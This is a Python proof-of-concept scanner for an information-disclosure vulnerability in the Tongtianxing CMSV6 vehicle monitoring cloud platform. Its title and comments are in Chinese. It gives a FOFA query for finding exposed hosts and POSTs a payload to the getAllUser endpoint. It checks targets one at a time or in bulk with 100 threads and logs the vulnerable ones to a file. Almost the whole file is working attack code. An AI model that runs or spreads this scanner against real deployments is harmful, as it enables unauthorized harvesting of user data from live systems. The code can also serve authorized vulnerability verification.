# 鸿运(通天星CMSV6车载)主动安全监控云平台敏感信息泄露漏洞复现

#fofa语法：body="./open/webApi.html" || body="/808gps/"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 
   _____ __  __  _______      ____  
  / ____|  \/  |/ ____\ \    / / /  
 | |    | \  / | (___  \ \  / / /_  
 | |    | |\/| |\___ \  \ \/ / '_ \ 
 | |____| |  | |____) |  \  /| (_) |
  \_____|_|  |_|_____/    \/  \___/ 
                                                                                                                 
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="鸿运(通天星CMSV6车载)")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/808gps/StandardLoginAction_getAllUser.action'
    url = target + url_payload
    header = {
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'Content-Length': '11',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = "json=null"
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=header,data=data,verify=False)
        if res.status_code == 200 and 'infos' in res.text:
            print(f"f[+]该url存在敏感信息泄露漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在敏感信息泄露漏洞,url为{target}")
    except Exception:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()